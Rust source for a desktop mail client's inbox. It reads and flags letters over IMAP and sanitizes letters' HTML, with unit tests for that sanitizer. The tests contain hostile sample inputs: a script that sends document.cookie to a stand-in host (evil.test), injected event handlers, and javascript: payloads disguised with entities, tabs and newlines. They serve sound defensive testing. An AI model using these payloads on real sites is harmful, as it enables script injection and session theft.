// The Mail page's inbox, from the mail kept on this computer (store.rs),
// with no wait for the server: conversations (threads.rs), one account's or
// every account's as one; all, the unread or the starred. A letter read
// whole: as kept, else from the server (then kept). Opening one on the page
// marks it read, as any mail program does (here at once, on the server just
// after); listing does not, nor does handing one to an agent. A star the
// same way, back as it was when the server says no.
use std::borrow::Cow;
use std::sync::Arc;

use io_imap::types::flag::Flag;
use mail_parser::{Address, Message, MessageParser, MimeHeaders};
use serde_json::{json, Value};
use tauri::AppHandle;

use super::imap::{self, session, Fail};
use super::store::{self, Folder};
use super::{account, accounts, agent, password_of, status_of, threads, Account, CONNECT};
use crate::{shared, Shared};

// The most conversations at once, and the most of a letter's text sent to
// the page.
const MOST: u32 = 2000;
const MOST_TEXT: usize = 100_000;

pub fn parse(raw: &[u8]) -> Option<Message<'_>> {
    MessageParser::default().parse(raw)
}

// The people in a header, as { name, address }.
pub fn people(list: Option<&Address>) -> Vec<Value> {
    list.map(|a| a.iter().map(|p| json!({ "name": p.name().unwrap_or("").trim(), "address": p.address().unwrap_or("").trim() })).collect()).unwrap_or_default()
}

// When it was sent (ms).
fn when(m: &Message) -> Option<i64> {
    m.date().map(|d| d.to_timestamp() * 1000)
}

// A letter's text: its plain part, else its HTML made plain; lines ending
// in \n and no more than one blank line in a row.
pub fn text(m: &Message) -> String {
    let body = m.body_text(0).unwrap_or(Cow::Borrowed(""));
    let mut out = String::with_capacity(body.len());
    let mut blank = 0;
    for line in body.replace("\r\n", "\n").split('\n') {
        let line = line.trim_end();
        blank = if line.is_empty() { blank + 1 } else { 0 };
        if blank < 2 {
            out.push_str(line);
            out.push('\n');
        }
    }
    out.trim().to_string()
}

// A letter's HTML, as it is drawn: its own styles, its own layout, its
// pictures. What is dangerous in it is taken out first — a letter is written
// by whoever sent it, and it is shown in her window, on the person's
// computer.
//
// Taken out: scripts (and the javascript: they call), the frames and the
// objects, the forms and the inputs, and the attributes that begin with
// "on" (a click that runs something). The styles and the pictures are left:
// they are what a letter is made of. The page shows it in a sandboxed frame
// as well, so that what is left cannot reach her.
pub fn html(m: &Message) -> String {
    // Only a genuine text/html part is read as HTML; a plain-text letter is
    // left empty here so the page draws it as plain text (.m-text).
    let Some(body) = m.html_bodies().find_map(|p| match &p.body {
        mail_parser::PartType::Html(h) => Some(h.as_ref()),
        _ => None,
    }) else {
        return String::new();
    };
    if body.trim().is_empty() {
        return String::new();
    }
    // A letter's HTML is not endless: what is past this is not shown (the
    // plain text is, which is the same letter in words).
    const MOST_HTML: usize = 1 << 20;
    let cut = body.char_indices().nth(MOST_HTML).map_or(body, |(at, _)| &body[..at]);
    let mut out = sanitize_html(cut);
    if out.contains("cid:") {
        out = inline_cid_images(m, out);
    }
    out
}

// Inline pictures carried in the letter itself (Content-ID, cid:...): turned
// into data: URIs so the sandboxed frame can draw them.
fn inline_cid_images(m: &Message, mut html: String) -> String {
    use base64::Engine;
    const MAX_INLINE: usize = 2 << 20;
    const SAFE_IMAGES: [&str; 7] = ["png", "jpeg", "jpg", "gif", "webp", "bmp", "x-icon"];
    for part in &m.parts {
        let Some(cid) = part.content_id() else { continue };
        let cid = cid.trim().trim_matches(['<', '>']);
        if cid.is_empty() || part.contents().is_empty() || part.contents().len() > MAX_INLINE {
            continue;
        }
        let Some(ct) = part.content_type() else { continue };
        if !ct.ctype().eq_ignore_ascii_case("image") {
            continue;
        }
        let sub = ct.subtype().unwrap_or("").to_ascii_lowercase();
        if !SAFE_IMAGES.contains(&sub.as_str()) {
            continue;
        }
        let needle = format!("cid:{cid}");
        if html.contains(&needle) {
            let data_uri = format!(
                "data:image/{sub};base64,{}",
                base64::engine::general_purpose::STANDARD.encode(part.contents())
            );
            html = html.replace(&needle, &data_uri);
        }
    }
    html
}

// Blocks dropped whole: the tag, its body, and the closing tag.
const DROPPED_BLOCKS: [(&str, &str); 4] = [
    ("script", "</script"),
    ("iframe", "</iframe"),
    ("object", "</object"),
    ("form", "</form"),
];
// Tags dropped without keeping anything of them.
const DROPPED_TAGS: [&str; 4] = ["embed", "base", "meta", "input"];

// Whether '<' begins a real HTML tag, comment, or declaration (rather than a
// bare '<' in text such as "1 < 2").
fn is_tag_start(slice: &str) -> bool {
    let b = slice.as_bytes();
    if b.len() < 2 || b[0] != b'<' {
        return false;
    }
    match b[1] {
        b'a'..=b'z' | b'A'..=b'Z' | b'!' | b'?' => true,
        b'/' => b.get(2).is_some_and(|c| c.is_ascii_alphabetic()),
        _ => false,
    }
}

// Finds the byte offset of the closing '>' of a tag starting with '<',
// respecting single and double quotes on attribute values (after '=') so that
// a '>' inside a quoted attribute value does not end the tag early, while an
// apostrophe in an unquoted value will not swallow the rest of the letter.
fn find_tag_end(slice: &str) -> Option<usize> {
    if slice.starts_with("<!--") {
        return slice.find("-->").map(|i| i + 2);
    }
    let mut in_quote: Option<char> = None;
    let mut after_eq = false;
    for (idx, ch) in slice.char_indices() {
        if idx == 0 {
            continue;
        }
        if let Some(q) = in_quote {
            if ch == q {
                in_quote = None;
            }
        } else if (ch == '"' || ch == '\'') && after_eq {
            in_quote = Some(ch);
            after_eq = false;
        } else if ch == '=' {
            after_eq = true;
        } else if ch == '>' {
            return Some(idx);
        } else if !ch.is_whitespace() {
            after_eq = false;
        }
    }
    None
}

fn sanitize_html(raw: &str) -> String {
    let lower = raw.to_ascii_lowercase();
    let mut out = String::with_capacity(raw.len());
    let mut at = 0usize;

    while at < raw.len() {
        let Some(p) = raw[at..].find('<') else {
            out.push_str(&raw[at..]);
            break;
        };
        let start = at + p;
        out.push_str(&raw[at..start]);

        let slice = &raw[start..];
        if !is_tag_start(slice) {
            out.push('<');
            at = start + 1;
            continue;
        }

        let Some(tag_end_rel) = find_tag_end(slice) else {
            // Unclosed tag at the end of the text.
            break;
        };
        let tag_bytes_end = start + tag_end_rel + 1;
        let tag_str = &raw[start..tag_bytes_end];

        // HTML comment or declaration: drop it.
        if tag_str.starts_with("<!--") || tag_str.starts_with("<!") || tag_str.starts_with("<?") {
            at = tag_bytes_end;
            continue;
        }

        let is_close = tag_str.starts_with("</");
        let name_start = if is_close { 2 } else { 1 };
        let name_slice = &tag_str[name_start..];
        let name_end_rel = name_slice
            .char_indices()
            .find(|&(_, ch)| ch.is_whitespace() || ch == '/' || ch == '>')
            .map(|(i, _)| i)
            .unwrap_or(name_slice.len());
        let tag_name = &lower[start + name_start..start + name_start + name_end_rel];

        // 1. Blocks to drop whole (opening tag, body, closing tag).
        if let Some(&(_, close_pat)) = DROPPED_BLOCKS.iter().find(|&&(name, _)| name == tag_name) {
            if !is_close {
                if let Some(close_pos) = lower[tag_bytes_end..].find(close_pat) {
                    let after_close = tag_bytes_end + close_pos;
                    if let Some(close_end) = find_tag_end(&raw[after_close..]) {
                        at = after_close + close_end + 1;
                    } else {
                        at = raw.len();
                    }
                } else if tag_name == "form" {
                    // An unclosed <form> in a broken template drops only the
                    // opening tag so the rest of the letter is still shown.
                    at = tag_bytes_end;
                } else {
                    at = raw.len();
                }
            } else {
                at = tag_bytes_end;
            }
            continue;
        }

        // 2. Void or standalone tags to drop.
        if DROPPED_TAGS.contains(&tag_name) {
            at = tag_bytes_end;
            continue;
        }

        // 3. Normal closing tag: keep it clean.
        if is_close {
            out.push_str("</");
            out.push_str(tag_name);
            out.push('>');
            at = tag_bytes_end;
            continue;
        }

        // 4. Normal opening or self-closing tag: clean its attributes.
        clean_tag_into(&mut out, tag_name, tag_str);
        at = tag_bytes_end;
    }

    out
}

// Decodes HTML numeric and scheme-relevant named character references,
// stripping whitespace and control characters, to check an address's scheme.
fn decode_for_scheme(val: &str) -> String {
    let mut out = String::with_capacity(val.len());
    let bytes = val.as_bytes();
    let mut i = 0;
    while i < bytes.len() {
        if bytes[i] == b'&' {
            let rest = &val[i + 1..];
            if let Some(hex_or_dec) = rest.strip_prefix('#') {
                let (is_hex, digits_str) = if let Some(h) = hex_or_dec.strip_prefix(['x', 'X']) {
                    (true, h)
                } else {
                    (false, hex_or_dec)
                };
                let len = digits_str
                    .bytes()
                    .take_while(|b| if is_hex { b.is_ascii_hexdigit() } else { b.is_ascii_digit() })
                    .count();
                if len > 0 {
                    let code = u32::from_str_radix(&digits_str[..len], if is_hex { 16 } else { 10 }).unwrap_or(0);
                    if let Some(ch) = char::from_u32(code) {
                        if !ch.is_whitespace() && !ch.is_control() {
                            out.push(ch.to_ascii_lowercase());
                        }
                    }
                    i += 2 + usize::from(is_hex) + len;
                    if i < bytes.len() && bytes[i] == b';' {
                        i += 1;
                    }
                    continue;
                }
            } else {
                // One of the names a scheme can be hidden with, matched on the
                // bytes after '&' (no copy of the rest of the address for each
                // '&': a link may have thousands). Any other '&' is itself, and
                // read as any character below: it once left `i` where it was,
                // and a link with "?a=1&b=2" or "&amp;" in it held the letter's
                // opening for ever.
                let named = [("colon", Some(':')), ("tab", None), ("newline", None)]
                    .into_iter()
                    .find(|(entity, _)| rest.as_bytes().get(..entity.len()).is_some_and(|b| b.eq_ignore_ascii_case(entity.as_bytes())));
                if let Some((entity, replacement)) = named {
                    if let Some(ch) = replacement {
                        out.push(ch);
                    }
                    i += 1 + entity.len();
                    if i < bytes.len() && bytes[i] == b';' {
                        i += 1;
                    }
                    continue;
                }
            }
        }
        let ch = val[i..].chars().next().unwrap();
        if !ch.is_whitespace() && !ch.is_control() {
            out.push(ch.to_ascii_lowercase());
        }
        i += ch.len_utf8();
    }
    out
}

fn is_dangerous_address(val: &str) -> bool {
    let norm = decode_for_scheme(val);
    if norm.starts_with("javascript:")
        || norm.starts_with("vbscript:")
        || norm.starts_with("data:text/")
        || norm.starts_with("data:application/")
        || norm.starts_with("data:image/svg")
    {
        return true;
    }
    let prefix_end = norm.find(['/', '?', '#']).unwrap_or(norm.len());
    if let Some(colon) = norm[..prefix_end].find(':') {
        let scheme = &norm[..colon];
        if !matches!(scheme, "http" | "https" | "mailto" | "tel" | "cid" | "data") {
            return true;
        }
        if scheme == "data" && !norm.starts_with("data:image/") {
            return true;
        }
    }
    false
}

fn clean_tag_into(res: &mut String, tag_name: &str, tag_str: &str) {
    let after_name = 1 + tag_name.len();
    if after_name >= tag_str.len() {
        res.push('<');
        res.push_str(tag_name);
        res.push('>');
        return;
    }
    let inside = &tag_str[after_name..tag_str.len() - 1];
    let is_self_closing = inside.trim_end().ends_with('/');
    let inside = if is_self_closing {
        let t = inside.trim_end();
        &t[..t.len() - 1]
    } else {
        inside
    };

    let mut it = inside.char_indices().peekable();
    res.push('<');
    res.push_str(tag_name);

    while it.peek().is_some() {
        // Skip whitespace (ASCII or Unicode spaces).
        while it.next_if(|&(_, c)| c.is_whitespace()).is_some() {}
        let Some(&(name_start, ch)) = it.peek() else { break };
        if ch == '/' || ch == '>' {
            break;
        }

        // Attribute name.
        while it
            .next_if(|&(_, c)| !c.is_whitespace() && c != '=' && c != '/' && c != '>')
            .is_some()
        {}
        let name_end = it.peek().map_or(inside.len(), |&(i, _)| i);
        let attr_name = &inside[name_start..name_end];
        if attr_name.is_empty() {
            it.next();
            continue;
        }

        // Whitespace before '='.
        while it.next_if(|&(_, c)| c.is_whitespace()).is_some() {}

        let (has_value, attr_value) = if it.next_if(|&(_, c)| c == '=').is_some() {
            while it.next_if(|&(_, c)| c.is_whitespace()).is_some() {}
            if let Some(&(_, quote)) = it.peek() {
                if quote == '"' || quote == '\'' {
                    it.next(); // consume opening quote
                    let val_start = it.peek().map_or(inside.len(), |&(i, _)| i);
                    while it.next_if(|&(_, c)| c != quote).is_some() {}
                    let val_end = it.peek().map_or(inside.len(), |&(i, _)| i);
                    let val = &inside[val_start..val_end];
                    it.next_if(|&(_, c)| c == quote);
                    (true, val)
                } else {
                    let val_start = it.peek().map_or(inside.len(), |&(i, _)| i);
                    while it.next_if(|&(_, c)| !c.is_whitespace() && c != '/' && c != '>').is_some() {}
                    let val_end = it.peek().map_or(inside.len(), |&(i, _)| i);
                    (true, &inside[val_start..val_end])
                }
            } else {
                (true, "")
            }
        } else {
            (false, "")
        };

        let lower_name = attr_name.to_ascii_lowercase();
        // Drop event handlers (onclick, onload, etc.) and srcdoc.
        if lower_name.starts_with("on") || lower_name == "srcdoc" {
            continue;
        }

        // xlink:href: an SVG link's or picture's address, which a letter's
        // <svg> may carry as well as href.
        const ADDRESS_ATTRS: [&str; 7] = ["href", "src", "action", "formaction", "poster", "background", "xlink:href"];
        if ADDRESS_ATTRS.contains(&lower_name.as_str()) && is_dangerous_address(attr_value) {
            res.push(' ');
            res.push_str(&lower_name);
            res.push_str("=\"about:blank\"");
            continue;
        }

        res.push(' ');
        res.push_str(attr_name);
        if has_value {
            res.push_str("=\"");
            for c in attr_value.chars() {
                if c == '"' {
                    res.push_str("&quot;");
                } else {
                    res.push(c);
                }
            }
            res.push('"');
        }
    }

    if is_self_closing {
        res.push_str(" />");
    } else {
        res.push('>');
    }
}

// A letter's attachments: name, size, type.
pub fn attachments(m: &Message) -> Vec<Value> {
    m.attachments()
        .map(|a| {
            let kind = a.content_type().map(|t| format!("{}/{}", t.ctype(), t.subtype().unwrap_or(""))).unwrap_or_default();
            json!({ "name": a.attachment_name().unwrap_or(""), "size": a.contents().len(), "type": kind })
        })
        .collect()
}

// Which conversations the inbox shows: all, those with a letter unread, or
// with one starred.
#[derive(Clone, Copy, PartialEq, Debug)]
pub enum Filter {
    All,
    Unseen,
    Flagged,
}

impl Filter {
    fn parse(s: &str) -> Filter {
        match s {
            "unseen" => Filter::Unseen,
            "flagged" => Filter::Flagged,
            _ => Filter::All,
        }
    }
}

// The accounts' conversations as kept, newest first (by their newest
// letter): the first `count`, how many there are, how many letters the
// inbox holds; the accounts that cannot be reached, with why; whether a
// first sync is still under way.
fn list(sh: &Shared, all: Vec<Account>, count: u32, filter: Filter) -> Value {
    let statuses: Vec<(Account, Value)> = all
        .into_iter()
        .map(|a| {
            let status = status_of(sh, &a.id);
            (a, status)
        })
        .collect();
    let (mut threads, mut letters, mut errors, mut syncing) = (Vec::new(), 0, Vec::new(), false);
    for (a, status) in &statuses {
        let st = store::of(sh, a);
        let s = st.lock().unwrap();
        threads.extend(threads::build(a, &s, filter));
        letters += s.inbox.letters.len();
        if status["state"] == "error" {
            errors.push(json!({ "account": a.id, "error": status["error"] }));
        } else if a.on && !s.synced[0] {
            syncing = true;
        }
    }
    threads.sort_by_key(|t| std::cmp::Reverse(t["latest"].as_i64().unwrap_or(0)));
    let total = threads.len();
    threads.truncate(count.clamp(1, MOST) as usize);
    json!({ "ok": true, "total": total, "letters": letters, "threads": threads, "errors": errors, "syncing": syncing })
}

// A letter whole: as kept, else from the server (then kept).
pub fn raw(sh: &Shared, account: &Account, folder: Folder, uid: u32) -> Result<Option<Vec<u8>>, Fail> {
    let st = store::of(sh, account);
    let (kept, name) = {
        let s = st.lock().unwrap();
        (s.body(folder, uid), s.get(folder).mailbox.clone())
    };
    if kept.is_some() {
        return Ok(kept);
    }
    let mailbox = imap::mailbox(&name).ok_or_else(|| Fail::Other("no such folder".into()))?;
    let mut s = session(&account.server, &password_of(account)?, CONNECT)?;
    s.folder(mailbox, false)?;
    let got = s.letter(uid)?;
    s.logout();
    if let Some((raw, _)) = &got {
        let mut s = st.lock().unwrap();
        s.keep_body(folder, uid, raw, true);
        s.save();
    }
    Ok(got.map(|(raw, _)| raw))
}

// A flag put on a letter or taken off: here at once, then on the server;
// back as it was when the server says no.
pub fn set_flag(sh: &Shared, account: &Account, folder: Folder, uid: u32, flag: Flag<'static>, what: &str, on: bool) -> Result<(), Fail> {
    let st = store::of(sh, account);
    let name = {
        let mut s = st.lock().unwrap();
        s.set_flag(folder, uid, what, on);
        s.get(folder).mailbox.clone()
    };
    let told = (|| -> Result<(), Fail> {
        let mailbox = imap::mailbox(&name).ok_or_else(|| Fail::Other("no such folder".into()))?;
        let mut s = session(&account.server, &password_of(account)?, CONNECT)?;
        s.folder(mailbox, true)?;
        s.set_flag(uid, flag, on)?;
        s.logout();
        Ok(())
    })();
    let mut s = st.lock().unwrap();
    if told.is_err() {
        s.set_flag(folder, uid, what, !on);
    }
    s.save();
    told
}

// A letter for the page.
fn view(m: &Message) -> Value {
    let text = text(m);
    let cut = text.char_indices().nth(MOST_TEXT).map_or(text.as_str(), |(at, _)| &text[..at]);
    let html = html(m);
    json!({
        "from": people(m.from()),
        "to": people(m.to()),
        "cc": people(m.cc()),
        "replyTo": people(m.reply_to()),
        "references": m.references().as_text_list().map(|l| l.iter().map(|r| r.trim()).filter(|r| !r.is_empty()).collect::<Vec<_>>()).unwrap_or_default(),
        "subject": m.subject().unwrap_or("").trim(),
        "date": when(m),
        "messageId": m.message_id().unwrap_or(""),
        "text": cut,
        "html": html,
        "cut": cut.len() < text.len(),
        "attachments": attachments(m),
    })
}

fn failed(fail: Fail) -> Value {
    json!({ "ok": false, "error": fail.json() })
}

fn gone() -> Value {
    json!({ "ok": false, "error": { "kind": "gone", "text": "" } })
}

// The inbox's conversations: one account's, or ("*") every account's as one.
#[tauri::command]
pub async fn mail_letters(app: AppHandle, id: String, count: u32, filter: String) -> Value {
    let sh = shared(&app);
    let filter = Filter::parse(&filter);
    let all: Vec<Account> = accounts(&sh).into_iter().filter(|a| id == "*" || a.id == id).collect();
    if all.is_empty() && id != "*" {
        return gone();
    }
    tauri::async_runtime::spawn_blocking(move || list(&sh, all, count, filter)).await.unwrap_or_else(|e| failed(Fail::Other(e.to_string())))
}

// A letter starred, or not any more.
#[tauri::command]
pub async fn mail_flag(app: AppHandle, id: String, uid: u32, on: bool, folder: Option<String>) -> Value {
    let sh = shared(&app);
    let Some(account) = account(&sh, &id) else { return gone() };
    let folder = Folder::parse(folder.as_deref().unwrap_or(""));
    let got = tauri::async_runtime::spawn_blocking(move || set_flag(&sh, &account, folder, uid, Flag::Flagged, "flagged", on)).await.unwrap_or_else(|e| Err(Fail::Other(e.to_string())));
    match got {
        Ok(()) => json!({ "ok": true }),
        Err(fail) => failed(fail),
    }
}

// A letter opened on the page: read whole (as kept, or from the server) and
// marked read (here at once, on the server just after); with its talk with
// an agent, if there is one.
#[tauri::command]
pub async fn mail_letter(app: AppHandle, id: String, uid: u32, folder: Option<String>) -> Value {
    let sh = shared(&app);
    let Some(account) = account(&sh, &id) else { return gone() };
    let folder = Folder::parse(folder.as_deref().unwrap_or(""));
    let (sh2, a) = (sh.clone(), account.clone());
    let got = tauri::async_runtime::spawn_blocking(move || -> Result<Option<(Value, Option<String>)>, Fail> {
        let Some(raw) = raw(&sh2, &a, folder, uid)? else { return Ok(None) };
        let Some(m) = parse(&raw) else { return Err(Fail::Other("unreadable".into())) };
        let mid = m.message_id().map(str::to_string);
        Ok(Some((view(&m), mid)))
    })
    .await
    .unwrap_or_else(|e| Err(Fail::Other(e.to_string())));
    let (mut letter, mid) = match got {
        Ok(Some(pair)) => pair,
        Ok(None) => return json!({ "ok": false, "error": { "kind": "noLetter", "text": "" } }),
        Err(fail) => return failed(fail),
    };
    let (seen, flagged) = {
        let st = store::of(&sh, &account);
        let mut s = st.lock().unwrap();
        // Opened: kept, whatever is kept offline.
        s.opened(folder, uid);
        s.get(folder).letters.get(&uid).map_or((false, false), |e| (e.seen, e.flagged))
    };
    if !seen {
        let (sh2, a) = (Arc::clone(&sh), account.clone());
        std::thread::spawn(move || {
            if let Err(fail) = set_flag(&sh2, &a, folder, uid, Flag::Seen, "seen", true) {
                sh2.log(&format!("mail {}: letter {uid} not marked read: {fail:?}", a.id));
            }
        });
    }
    letter["uid"] = json!(uid);
    let key = agent::key(&id, uid, mid.as_deref());
    letter["key"] = json!(key);
    letter["account"] = json!(id);
    letter["folder"] = json!(folder.name());
    letter["flagged"] = json!(flagged);
    json!({ "ok": true, "letter": letter, "talk": agent::talk_view(&sh, &key) })
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn a_letter_reads_as_text_and_attachments() {
        let raw = b"From: \"Zhang San\" <zs@vendor.example>\r\nTo: me@example.test, Li <li@example.test>\r\nSubject: =?UTF-8?B?5ZCI5ZCM?=\r\nDate: Fri, 09 Oct 2026 10:15:00 +0800\r\nMessage-ID: <c4@vendor.example>\r\nContent-Type: multipart/mixed; boundary=b\r\n\r\n--b\r\nContent-Type: text/plain; charset=utf-8\r\n\r\nline one\r\n\r\n\r\n\r\nline two   \r\n--b\r\nContent-Type: text/plain; name=notes.txt\r\nContent-Disposition: attachment; filename=notes.txt\r\n\r\nabc\r\n--b--\r\n";
        let m = parse(raw).unwrap();
        assert_eq!(text(&m), "line one\n\nline two");
        let v = view(&m);
        assert_eq!(v["subject"], "合同");
        assert_eq!(v["html"], "");
        assert_eq!(v["to"][1], json!({ "name": "Li", "address": "li@example.test" }));
        assert_eq!(v["attachments"][0]["name"], "notes.txt");
        assert_eq!((v["replyTo"].as_array().map(Vec::len), v["references"].as_array().map(Vec::len)), (Some(0), Some(0)));
        let replied = parse(b"From: a@b.test\r\nReply-To: List <list@b.test>\r\nReferences: <r1@x> <r2@x>\r\nSubject: s\r\n\r\nhi\r\n").unwrap();
        assert_eq!((view(&replied)["replyTo"][0]["address"].as_str(), view(&replied)["references"].clone()), (Some("list@b.test"), json!(["r1@x", "r2@x"])));
        assert_eq!(v["date"], 1_791_512_100_000i64);
    }

    #[test]
    fn a_letters_html_is_shown_but_its_scripts_are_not() {
        let raw = b"From: a@b.test\r\nSubject: s\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<html><head><style>.a{color:red}</style></head><body><div class=\"a\">\xe6\x97\xa5\xe6\x9c\xac</div><script>fetch('http://evil.test/'+document.cookie)</script><img src=\"http://track.test/p.gif\"></body></html>\r\n";
        let m = parse(raw).unwrap();
        let h = html(&m);
        assert!(h.contains(".a{color:red}"), "the styles are kept: {h}");
        assert!(h.contains("日本"), "the text is kept: {h}");
        assert!(h.contains("track.test/p.gif"), "the pictures are kept: {h}");
        assert!(!h.contains("<script"), "no script: {h}");
        assert!(!h.contains("document.cookie"), "nothing of the script is left: {h}");
        assert!(text(&m).contains("日本"));
    }

    #[test]
    fn a_tag_with_greater_than_inside_quoted_attribute_does_not_leak_event_handlers() {
        // Attribute values with '>' inside quotes must not break the tag boundary or leak subsequent handlers
        let h = sanitize_html(r#"<a title="Click > here" onclick="steal()" href="https://safe.test">Link</a>"#);
        assert!(!h.contains("onclick"), "onclick must be removed: {h}");
        assert!(!h.contains("steal()"), "steal() must not leak: {h}");
        assert!(h.contains("Click > here"), "title with > preserved: {h}");
        assert!(h.contains("https://safe.test"), "safe href preserved: {h}");

        // Single quotes containing '>'
        let h2 = sanitize_html(r#"<div title='foo > bar' onerror='bad()'>Content</div>"#);
        assert!(!h2.contains("onerror"), "onerror must be removed: {h2}");
        assert!(!h2.contains("bad()"), "bad() must not leak: {h2}");
        assert!(h2.contains("foo > bar"), "title with single quotes preserved: {h2}");

        // Unquoted attribute with apostrophe (e.g. title=it's) must not swallow the closing '>'
        let h3 = sanitize_html(r#"<div title=it's onclick="steal()">ok</div><p>next</p>"#);
        assert!(!h3.contains("onclick"), "onclick removed after unquoted apostrophe: {h3}");
        assert!(h3.contains(">ok</div><p>next</p>"), "tag closed properly: {h3}");

        // Bare '<' in text followed by apostrophe must not swallow subsequent tags
        let h4 = sanitize_html("1 < 2, it's ok <b>bold</b>");
        assert_eq!(h4, "1 < 2, it's ok <b>bold</b>");
    }

    #[test]
    fn non_ascii_whitespace_in_tag_does_not_panic() {
        // Non-ASCII whitespace characters like U+00A0 (NBSP) and U+3000 (ideographic space)
        // must be sliced strictly on character boundaries without panicking.
        let h = sanitize_html("<div\u{00a0}class=\"test\"\u{00a0}onclick=\"steal()\">safe</div>");
        assert_eq!(h, "<div class=\"test\">safe</div>");

        let h2 = sanitize_html("<a\u{3000}href=\"https://ok.test\"\u{3000}onmouseover=\"steal()\">link</a>");
        assert_eq!(h2, "<a href=\"https://ok.test\">link</a>");

        // Mixture of multi-byte spaces and unicode characters
        let h3 = sanitize_html("<span\u{3000}title=\"你好\u{00a0}世界\"\u{00a0}onclick=\"alert(1)\">文</span>");
        assert!(!h3.contains("onclick"), "onclick removed: {h3}");
        assert!(h3.contains("你好\u{00a0}世界"), "unicode attribute kept: {h3}");
    }

    #[test]
    fn dangerous_tags_and_schemes_are_taken_out() {
        // Script tag with '>' in an attribute must be dropped whole
        let h = sanitize_html(r#"<script title=">">alert(1)</script>safe text"#);
        assert!(!h.contains("alert"), "script body dropped: {h}");
        assert_eq!(h, "safe text");

        // Javascript schemes (plain, whitespace-padded, HTML numeric & named entities)
        for bad in [
            r#"<a href="javascript:alert(1)">x</a>"#,
            "<a href=\" java\nscript:alert(1) \">x</a>",
            r#"<a href="&#106;avascript:alert(1)">x</a>"#,
            r#"<a href="&#x6a;avascript:alert(1)">x</a>"#,
            r#"<a href="&#0000106avascript:alert(1)">x</a>"#,
            r#"<a href="javascript&colon;alert(1)">x</a>"#,
            r#"<a href="jav&#x09;ascript:alert(1)">x</a>"#,
            r#"<a href="vbscript:msgbox">x</a>"#,
            r#"<a href="data:text/html,<script>alert(1)</script>">x</a>"#,
            r#"<img src="data:image/svg+xml;base64,PHN2Zz4=">"#,
        ] {
            let h = sanitize_html(bad);
            assert!(h.contains("about:blank"), "dangerous scheme neutralized in {bad}: {h}");
        }

        // Safe schemes and raster data:image/* are preserved
        let safe = sanitize_html(r##"<a href="https://example.com">1</a><a href="mailto:a@b.c">2</a><a href="#top">3</a><img src="data:image/png;base64,iVBORw0KGgo=">"##);
        assert!(!safe.contains("about:blank"), "safe URLs preserved: {safe}");

        // Frames, embeds, objects, forms
        for tag in ["iframe", "object", "form"] {
            let h = sanitize_html(&format!("<{t} src=\"http://x.test\"><p>hidden</p></{t}>after", t = tag));
            assert!(!h.contains("x.test"), "{tag} removed: {h}");
            assert!(!h.contains("hidden"), "{tag} body removed: {h}");
            assert!(h.contains("after"), "{tag} trailing kept: {h}");
        }
        let h = sanitize_html("<embed src=\"http://x.test\">after");
        assert!(!h.contains("x.test"), "embed removed: {h}");
        assert!(h.contains("after"), "after kept: {h}");

        // Unclosed <form> in broken newsletter template drops <form> and <input> but preserves body text
        let h = sanitize_html("<form action=\"https://evil.test\"><input type=\"text\"><p>Newsletter body</p>");
        assert!(!h.contains("<form"), "unclosed form tag removed: {h}");
        assert!(!h.contains("<input"), "input tag removed: {h}");
        assert!(h.contains("<p>Newsletter body</p>"), "newsletter content after unclosed form kept: {h}");

        // Unclosed script at EOF dropped
        let h = sanitize_html("<script>fetch('evil')");
        assert!(!h.contains("evil"), "unclosed script dropped: {h}");
    }

    // A link with '&' in it (a query, bare or written &amp;) is kept as it is
    // and comes back at once: such an '&' once held the scheme's check where
    // it was, for ever, and the letter never opened. An SVG link's
    // xlink:href is checked as href is.
    #[test]
    fn links_with_ampersands_are_kept_and_svg_links_checked() {
        let kept = [
            r#"<a href="https://e.test/?a=1&amp;b=2">x</a>"#,
            r#"<a href="https://e.test/?a=1&b=2&c">x</a>"#,
            r#"<img src="https://img.test/p.gif?u=1&t=2">"#,
            r#"<a href="https://e.test/&#x26;&lt;&">x</a>"#,
            r#"<a href="https://e.test/?q=1&r=javascript&colon;x">x</a>"#,
        ];
        let (tx, rx) = std::sync::mpsc::channel();
        std::thread::spawn(move || {
            let _ = tx.send(kept.map(sanitize_html));
        });
        let got = rx.recv_timeout(std::time::Duration::from_secs(5)).expect("read at once, not held");
        for (h, was) in got.iter().zip(kept) {
            assert_eq!(h, was, "kept as it was");
        }
        let h = sanitize_html(r#"<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>"#);
        assert!(h.contains(r#"xlink:href="about:blank""#) && !h.contains("javascript"), "{h}");
        let h = sanitize_html(r#"<a href="java&#x09;script&colon;alert(1)&amp;x">x</a>"#);
        assert!(h.contains("about:blank"), "{h}");
    }

    #[test]
    fn inline_cid_images_are_resolved_to_data_uris() {
        let raw = b"From: a@b.test\r\nSubject: s\r\nContent-Type: multipart/related; boundary=b\r\n\r\n--b\r\nContent-Type: text/html; charset=utf-8\r\n\r\n<p><img src=\"cid:logo@test\"></p>\r\n--b\r\nContent-Type: image/png\r\nContent-Transfer-Encoding: base64\r\nContent-ID: <logo@test>\r\n\r\niVBORw0KGgo=\r\n--b--\r\n";
        let m = parse(raw).unwrap();
        let h = html(&m);
        assert!(h.contains("data:image/png;base64,iVBORw0KGgo="), "cid resolved to data URI: {h}");
        assert!(!h.contains("cid:logo@test"), "cid replaced: {h}");
    }
}
